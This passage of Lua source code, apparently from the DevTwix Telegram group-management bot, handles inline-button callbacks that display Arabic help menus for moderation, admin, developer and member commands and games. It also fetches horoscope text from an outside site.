keyboard.inline_keyboard = {
{{text="˛ آلمطـور ᥀",url="t.me/"..(dp.username_ or "DevTwix")}},
{{text="˛ آضفني لمجموعتك ᥀",url="t.me/"..dp.username_.."?startgroup=botstart"}},}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end end
------------------------------------------------------------------
if DataText and DataText:match("^(%d+)Getprj(.*)$") then
local notId  = DataText:match("(%d+)")  
local OnID = DataText:gsub('Getprj',''):gsub(notId,'')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
local notText = '⋄︙عذرا الامر ليس لك ? '
https.request("https://api.telegram.org/bot"..TokenBot.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
gk = https.request('https://black-source.tk/BlackTeAM/Horoscopes.php?br='..URL.escape(OnID))
br = JSON.decode(gk)
keyboard = {} 
keyboard.inline_keyboard = {
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(br.ok.hso).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
------------------------------------------------------------------
if DataText and DataText:match('/HelpList:(.*)') then
local HmD = DataText:match('/HelpList:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
local Help = DevHmD:get(DevTwix..'HmD:Help')
local Text = [[
⋄︙*توجد » 5 اوامر في البوت
•••••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••••
⋄︙ارسل { م1 } » اوامر الحمايه
⋄︙ارسل { م2 } » اوامر الادمنيه
⋄︙ارسل { م3 } » اوامر المدراء
⋄︙ارسل { م4 } » اوامر المنشئين
⋄︙ارسل { م5 } » اوامر مطورين البوت
•••••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••••
⋄︙Source » @DevTwix .*
]] 
keyboard = {} 
keyboard.inline_keyboard = {
{{text="𓍹 𝟏 𓍻",callback_data="/HelpList1:"..data.sender_user_id_},{text="𓍹 𝟐 𓍻",callback_data="/HelpList2:"..data.sender_user_id_},{text="𓍹 𝟑 𓍻",callback_data="/HelpList3:"..data.sender_user_id_}},
{{text="𓍹 𝟒 𓍻",callback_data="/HelpList4:"..data.sender_user_id_},{text="𓍹 𝟓 𓍻",callback_data="/HelpList5:"..data.sender_user_id_},{text="𓍹 𝟔 𓍻",callback_data="/HelpList6:"..data.sender_user_id_}},
{{text="{ آوآمر الترتيب }",callback_data="/HelpList7:"..data.sender_user_id_},{text="{ آلالعاب }",callback_data="/HelpList8:"..data.sender_user_id_}},
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList1:(.*)') then
local HmD = DataText:match('/HelpList1:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevHmD:get(DevTwix..'HmD:Help1')
local Text = [[
⋄︙*اوامر حماية المجموعه
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙قفل • فتح » الروابط
⋄︙قفل • فتح » المعرفات
⋄︙قفل • فتح » البوتات
⋄︙قفل • فتح » المتحركه
⋄︙قفل • فتح » الملصقات
⋄︙قفل • فتح » الملفات
⋄︙قفل • فتح » الصور
⋄︙قفل • فتح » الفيديو
⋄︙قفل • فتح » الاونلاين
⋄︙قفل • فتح » الدردشه
⋄︙قفل • فتح » التوجيه
⋄︙قفل • فتح » الاغاني
⋄︙قفل • فتح » الصوت
⋄︙قفل • فتح » الجهات
⋄︙قفل • فتح » الماركداون
⋄︙قفل • فتح » التكرار
⋄︙قفل • فتح » الهاشتاك
⋄︙قفل • فتح » التعديل
⋄︙قفل • فتح » التثبيت
⋄︙قفل • فتح » الاشعارات
⋄︙قفل • فتح » الكلايش
⋄︙قفل • فتح » الدخول
⋄︙قفل • فتح » الشبكات
⋄︙قفل • فتح » المواقع
⋄︙قفل • فتح » الفشار
⋄︙قفل • فتح » الكفر
⋄︙قفل • فتح » الطائفيه
⋄︙قفل • فتح » الكل
⋄︙قفل • فتح » العربيه
⋄︙قفل • فتح » الانكليزيه
⋄︙قفل • فتح » الفارسيه
⋄︙قفل • فتح » التفليش
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙اوامر حمايه اخرى
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙قفل • فتح + الامر
⋄︙التكرار بالطرد
⋄︙التكرار بالكتم
⋄︙التكرار بالتقيد
⋄︙الفارسيه بالطرد
⋄︙البوتات بالطرد
⋄︙البوتات بالتقيد
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙Source » @DevTwix .*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="𓍹 𝟏 𓍻",callback_data="/HelpList1:"..data.sender_user_id_},{text="𓍹 𝟐 𓍻",callback_data="/HelpList2:"..data.sender_user_id_},{text="𓍹 𝟑 𓍻",callback_data="/HelpList3:"..data.sender_user_id_}},
{{text="𓍹 𝟒 𓍻",callback_data="/HelpList4:"..data.sender_user_id_},{text="𓍹 𝟓 𓍻",callback_data="/HelpList5:"..data.sender_user_id_},{text="𓍹 𝟔 𓍻",callback_data="/HelpList6:"..data.sender_user_id_}},
{{text="{ آوآمر الترتيب }",callback_data="/HelpList7:"..data.sender_user_id_},{text="{ آلالعاب }",callback_data="/HelpList8:"..data.sender_user_id_}},
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList2:(.*)') then
local HmD = DataText:match('/HelpList2:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevHmD:get(DevTwix..'HmD:Help2')
local Text = [[
⋄︙*اوامر الادمنيه
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙الاعدادت
⋄︙تاك للكل 
⋄︙انشاء رابط
⋄︙ضع وصف
⋄︙ضع رابط
⋄︙ضع صوره
⋄︙حذف الرابط
⋄︙كشف البوتات
⋄︙طرد البوتات
⋄︙تنظيف + العدد
⋄︙تنظيف التعديل
⋄︙كللهم + الكلمه
⋄︙اسم البوت + الامر
⋄︙ضع • حذف » ترحيب
⋄︙ضع • حذف » قوانين
⋄︙اضف • حذف » صلاحيه
⋄︙الصلاحيات • حذف الصلاحيات
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙ضع سبام + العدد
⋄︙ضع تكرار + العدد
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙رفع مميز • تنزيل مميز
⋄︙المميزين • حذف المميزين
⋄︙كشف القيود • رفع القيود
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙حذف • مسح + بالرد
⋄︙منع • الغاء منع
⋄︙قائمه المنع
⋄︙حذف قائمه المنع
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙تفعيل • تعطيل » الرابط
⋄︙تفعيل • تعطيل » الالعاب
⋄︙تفعيل • تعطيل » الترحيب
⋄︙تفعيل • تعطيل » التاك للكل
⋄︙تفعيل • تعطيل » كشف الاعدادات
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙طرد المحذوفين
⋄︙طرد » بالرد • بالمعرف • بالايدي
⋄︙كتم • الغاء كتم
⋄︙تقيد • الغاء تقيد
⋄︙حظر • الغاء حظر
⋄︙المكتومين • حذف المكتومين
⋄︙المقيدين • حذف المقيدين
⋄︙المحظورين • حذف المحظورين
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙تقييد دقيقه + عدد الدقائق
⋄︙تقييد ساعه + عدد الساعات
⋄︙تقييد يوم + عدد الايام
⋄︙الغاء تقييد » لالغاء التقييد بالوقت
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙Source » @DevTwix .*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="𓍹 𝟏 𓍻",callback_data="/HelpList1:"..data.sender_user_id_},{text="𓍹 𝟐 𓍻",callback_data="/HelpList2:"..data.sender_user_id_},{text="𓍹 𝟑 𓍻",callback_data="/HelpList3:"..data.sender_user_id_}},
{{text="𓍹 𝟒 𓍻",callback_data="/HelpList4:"..data.sender_user_id_},{text="𓍹 𝟓 𓍻",callback_data="/HelpList5:"..data.sender_user_id_},{text="𓍹 𝟔 𓍻",callback_data="/HelpList6:"..data.sender_user_id_}},
{{text="{ آوآمر الترتيب }",callback_data="/HelpList7:"..data.sender_user_id_},{text="{ آلالعاب }",callback_data="/HelpList8:"..data.sender_user_id_}},
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList3:(.*)') then
local HmD = DataText:match('/HelpList3:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevHmD:get(DevTwix..'HmD:Help3')
local Text = [[
⋄︙*اوامر المدراء
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙فحص البوت
⋄︙ضع اسم + الاسم
⋄︙اضف • حذف » رد
⋄︙ردود المدير
⋄︙حذف ردود المدير
⋄︙اضف • حذف » رد متعدد
⋄︙حذف رد من متعدد
⋄︙الردود المتعدده
⋄︙حذف الردود المتعدده
⋄︙حذف قوائم المنع
⋄︙منع » بالرد على ( ملصق • صوره • متحركه )
⋄︙حذف قائمه منع +
( الصور • المتحركات • الملصقات )
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙تنزيل الكل
⋄︙رفع ادمن • تنزيل ادمن
⋄︙الادمنيه • حذف الادمنيه
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙تثبيت
⋄︙الغاء التثبيت
⋄︙اعاده التثبيت
⋄︙الغاء تثبيت الكل
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙تغير رد + اسم الرتبه + النص
⋄︙المطور • منشئ الاساسي
⋄︙المنشئ • المدير • الادمن
⋄︙المميز • المنظف • العضو
⋄︙حذف ردود الرتب
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙تغيير الايدي » لتغيير الكليشه
⋄︙تعيين الايدي » لتعيين الكليشه
⋄︙حذف الايدي » لحذف الكليشه
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙تفعيل • تعطيل + الامر » 
⋄︙اطردني • الايدي بالصوره • الابراج
⋄︙معاني الاسماء • اوامر النسب • انطق
⋄︙الايدي • تحويل الصيغ • اوامر التحشيش
⋄︙ردود المدير • ردود المطور • التحقق
⋄︙ضافني • حساب العمر • الزخرفه
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙Source » @DevTwix .*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="𓍹 𝟏 𓍻",callback_data="/HelpList1:"..data.sender_user_id_},{text="𓍹 𝟐 𓍻",callback_data="/HelpList2:"..data.sender_user_id_},{text="𓍹 𝟑 𓍻",callback_data="/HelpList3:"..data.sender_user_id_}},
{{text="𓍹 𝟒 𓍻",callback_data="/HelpList4:"..data.sender_user_id_},{text="𓍹 𝟓 𓍻",callback_data="/HelpList5:"..data.sender_user_id_},{text="𓍹 𝟔 𓍻",callback_data="/HelpList6:"..data.sender_user_id_}},
{{text="{ آوآمر الترتيب }",callback_data="/HelpList7:"..data.sender_user_id_},{text="{ آلالعاب }",callback_data="/HelpList8:"..data.sender_user_id_}},
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList4:(.*)') then
local HmD = DataText:match('/HelpList4:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevHmD:get(DevTwix..'HmD:Help4')
local Text = [[
⋄︙*اوامر المنشئين
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙تنزيل الكل
⋄︙الميديا • امسح
⋄︙تعين عدد الحذف
⋄︙ترتيب الاوامر
⋄︙اضف • حذف » امر
⋄︙حذف الاوامر المضافه
⋄︙الاوامر المضافه
⋄︙اضف نقاط » بالرد • بالايدي
⋄︙اضف رسائل » بالرد • بالايدي
⋄︙رفع منظف • تنزيل منظف
⋄︙المنظفين • حذف المنظفين
⋄︙رفع مدير • تنزيل مدير
⋄︙المدراء • حذف المدراء
⋄︙تفعيل • تعطيل + الامر
⋄︙نزلني • امسح
⋄︙الحظر • الكتم
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙اوامر المنشئين الاساسيين
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙وضع لقب + اللقب
⋄︙تفعيل • تعطيل » الرفع
⋄︙رفع منشئ • تنزيل منشئ
⋄︙المنشئين • حذف المنشئين
⋄︙رفع • تنزيل » مشرف
⋄︙رفع بكل الصلاحيات
⋄︙حذف القوائم
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙اوامر المالكين
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙رفع • تنزيل » منشئ اساسي
⋄︙حذف المنشئين الاساسيين 
⋄︙المنشئين الاساسيين 
⋄︙حذف جميع الرتب
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙Source » @DevTwix .*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="𓍹 𝟏 𓍻",callback_data="/HelpList1:"..data.sender_user_id_},{text="𓍹 𝟐 𓍻",callback_data="/HelpList2:"..data.sender_user_id_},{text="𓍹 𝟑 𓍻",callback_data="/HelpList3:"..data.sender_user_id_}},
{{text="𓍹 𝟒 𓍻",callback_data="/HelpList4:"..data.sender_user_id_},{text="𓍹 𝟓 𓍻",callback_data="/HelpList5:"..data.sender_user_id_},{text="𓍹 𝟔 𓍻",callback_data="/HelpList6:"..data.sender_user_id_}},
{{text="{ آوآمر الترتيب }",callback_data="/HelpList7:"..data.sender_user_id_},{text="{ آلالعاب }",callback_data="/HelpList8:"..data.sender_user_id_}},
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList5:(.*)') then
local HmD = DataText:match('/HelpList5:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
if not SudoBot(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ آلامر للمطور الاساسي عزيزي .")..'&show_alert=true')
end
local Help = DevHmD:get(DevTwix..'HmD:Help5')
local Text = [[
⋄︙*اوامر المطورين 
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙الكروبات
⋄︙المطورين
⋄︙المشتركين
⋄︙الاحصائيات
⋄︙المجموعات
⋄︙اسم البوت + غادر
⋄︙اسم البوت + تعطيل
⋄︙كشف + -ايدي المجموعه
⋄︙رفع مالك • تنزيل مالك
⋄︙المالكين • حذف المالكين
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙رفع • تنزيل » مدير عام
⋄︙حذف • المدراء العامين 
⋄︙رفع • تنزيل » ادمن عام
⋄︙حذف • الادمنيه العامين 
⋄︙رفع • تنزيل » مميز عام
⋄︙حذف • المميزين عام 
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙اوامر المطور الاساسي 
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙تحديث
⋄︙السيرفر
⋄︙روابط الكروبات
⋄︙تحديث السورس
⋄︙تنظيف الكروبات
⋄︙تنظيف المشتركين
⋄︙حذف جميع الملفات
⋄︙تعيين الايدي العام
⋄︙تغير المطور الاساسي
⋄︙حذف معلومات الترحيب
⋄︙تغير معلومات الترحيب
⋄︙غادر + -ايدي المجموعه
⋄︙تعيين عدد الاعضاء + العدد
⋄︙حظر عام • الغاء العام
⋄︙كتم عام • الغاء العام
⋄︙قائمه العام • حذف قائمه العام
⋄︙وضع • حذف » اسم البوت
⋄︙اضف • حذف » رد عام
⋄︙ردود المطور • حذف ردود المطور
⋄︙تعيين • حذف • جلب » رد الخاص
⋄︙جلب نسخه الكروبات
⋄︙رفع النسخه + بالرد على الملف
⋄︙تعيين • حذف » قناة الاشتراك
⋄︙جلب كليشه الاشتراك
⋄︙تغيير • حذف » كليشه الاشتراك
⋄︙رفع • تنزيل » مطور
⋄︙المطورين • حذف المطورين
⋄︙رفع • تنزيل » مطور ثانوي
⋄︙الثانويين • حذف الثانويين
⋄︙تعيين • حذف » كليشة الايدي
⋄︙اذاعه للكل بالتوجيه » بالرد
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙تفعيل ملف + اسم الملف
⋄︙تعطيل ملف + اسم الملف
⋄︙تفعيل • تعطيل + الامر 
⋄︙الاذاعه • الاشتراك الاجباري
⋄︙ترحيب البوت • المغادره
⋄︙البوت الخدمي • التواصل
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙Source » @DevTwix .*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="𓍹 𝟏 𓍻",callback_data="/HelpList1:"..data.sender_user_id_},{text="𓍹 𝟐 𓍻",callback_data="/HelpList2:"..data.sender_user_id_},{text="𓍹 𝟑 𓍻",callback_data="/HelpList3:"..data.sender_user_id_}},
{{text="𓍹 𝟒 𓍻",callback_data="/HelpList4:"..data.sender_user_id_},{text="𓍹 𝟓 𓍻",callback_data="/HelpList5:"..data.sender_user_id_},{text="𓍹 𝟔 𓍻",callback_data="/HelpList6:"..data.sender_user_id_}},
{{text="{ آوآمر الترتيب }",callback_data="/HelpList7:"..data.sender_user_id_},{text="{ آلالعاب }",callback_data="/HelpList8:"..data.sender_user_id_}},
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList6:(.*)') then
local HmD = DataText:match('/HelpList6:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
local Help = DevHmD:get(DevTwix..'HmD:Help6')
local Text = [[
⋄︙*اوامر الاعضاء 
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙السورس • موقعي • رتبتي • معلوماتي 
⋄︙رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
⋄︙ميمز • متحركه • صوره • ريمكس • فلم • مسلسل • انمي
⋄︙رسائلي • حذف رسائلي • اسمي • معرفي 
⋄︙ايدي •ايديي • جهاتي • راسلني • الالعاب 
⋄︙مجوهراتي • بيع مجوهراتي • القوانين • زخرفه 
⋄︙رابط الحذف • نزلني • اطردني • المطور 
⋄︙منو ضافني • مشاهدات المنشور • الرابط 
⋄︙ايدي المجموعه • معلومات المجموعه 
⋄︙نسبه الحب • نسبه الكره • نسبه الغباء 
⋄︙نسبه الرجوله • نسبه الانوثه • التفاعل
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙لقبه + بالرد
⋄︙كول + الكلمه
⋄︙زخرفه + اسمك
⋄︙برج + نوع البرج
⋄︙معنى اسم + الاسم
⋄︙بوسه • بوسها » بالرد
⋄︙احسب + تاريخ ميلادك
⋄︙صلاحياته » بالرد • بالمعرف • بالايدي
⋄︙ايدي • كشف  » بالرد • بالمعرف • بالايدي
⋄︙تحويل + بالرد » صوره • ملصق • صوت • بصمه
⋄︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙Source » @DevTwix .*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="𓍹 𝟏 𓍻",callback_data="/HelpList1:"..data.sender_user_id_},{text="𓍹 𝟐 𓍻",callback_data="/HelpList2:"..data.sender_user_id_},{text="𓍹 𝟑 𓍻",callback_data="/HelpList3:"..data.sender_user_id_}},
{{text="𓍹 𝟒 𓍻",callback_data="/HelpList4:"..data.sender_user_id_},{text="𓍹 𝟓 𓍻",callback_data="/HelpList5:"..data.sender_user_id_},{text="𓍹 𝟔 𓍻",callback_data="/HelpList6:"..data.sender_user_id_}},
{{text="{ آوآمر الترتيب }",callback_data="/HelpList7:"..data.sender_user_id_},{text="{ آلالعاب }",callback_data="/HelpList8:"..data.sender_user_id_}},
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList7:(.*)') then
local HmD = DataText:match('/HelpList7:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
local Help = DevHmD:get(DevTwix..'HmD:Help7')
local Text = [[
⋄︙*قائمة اوامر الترتيب 
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙يمكنك استخدام الاوامر التالية
⋄︙لترتيب جميع الاوامر بشكل تسلسلي
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙ترتيب الكل
⋄︙ترتيب الاوامر
⋄︙ترتيب اوامر الرفع
⋄︙ترتيب اوامر التنزيل
⋄︙ترتيب اوامر التفعيل
⋄︙ترتيب اوامر التعطيل
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙Source » @DevTwix .*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="𓍹 𝟏 𓍻",callback_data="/HelpList1:"..data.sender_user_id_},{text="𓍹 𝟐 𓍻",callback_data="/HelpList2:"..data.sender_user_id_},{text="𓍹 𝟑 𓍻",callback_data="/HelpList3:"..data.sender_user_id_}},
{{text="𓍹 𝟒 𓍻",callback_data="/HelpList4:"..data.sender_user_id_},{text="𓍹 𝟓 𓍻",callback_data="/HelpList5:"..data.sender_user_id_},{text="𓍹 𝟔 𓍻",callback_data="/HelpList6:"..data.sender_user_id_}},
{{text="{ آوآمر الترتيب }",callback_data="/HelpList7:"..data.sender_user_id_},{text="{ آلالعاب }",callback_data="/HelpList8:"..data.sender_user_id_}},
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList8:(.*)') then
local HmD = DataText:match('/HelpList8:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
local Help = DevHmD:get(DevTwix..'HmD:Help8')
local Text = [[
⋄︙*قائمة الالعاب البوت  » 
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙لعبة التخمين » خمن
⋄︙لعبة الامثله » امثله
⋄︙لعبة العكس » العكس
⋄︙لعبة الاسئله » اسئله
⋄︙لعبة الروليت » روليت
⋄︙لعبة الحزوره » حزوره
⋄︙لعبة الترتيب » ترتيب
⋄︙لعبة المعاني » معاني
⋄︙لعبة التويت » كت تويت
⋄︙لعبة المختلف » المختلف
⋄︙لعبة السمايلات » سمايلات
⋄︙لعبة المحيبس » المحيبس
⋄︙لعبة الرياضيات » رياضيات
⋄︙لعبة الانكليزيه » انكليزيه
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙مجوهراتي ← لعرض عدد الارباح
⋄︙بيع مجوهراتي ← { العدد } ← لبيع كل مجوهره مقابل {50} رساله
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙Source » @DevTwix .*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="𓍹 𝟏 𓍻",callback_data="/HelpList1:"..data.sender_user_id_},{text="𓍹 𝟐 𓍻",callback_data="/HelpList2:"..data.sender_user_id_},{text="𓍹 𝟑 𓍻",callback_data="/HelpList3:"..data.sender_user_id_}},
{{text="𓍹 𝟒 𓍻",callback_data="/HelpList4:"..data.sender_user_id_},{text="𓍹 𝟓 𓍻",callback_data="/HelpList5:"..data.sender_user_id_},{text="𓍹 𝟔 𓍻",callback_data="/HelpList6:"..data.sender_user_id_}},
{{text="{ آوآمر الترتيب }",callback_data="/HelpList7:"..data.sender_user_id_},{text="{ آلالعاب }",callback_data="/HelpList8:"..data.sender_user_id_}},
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
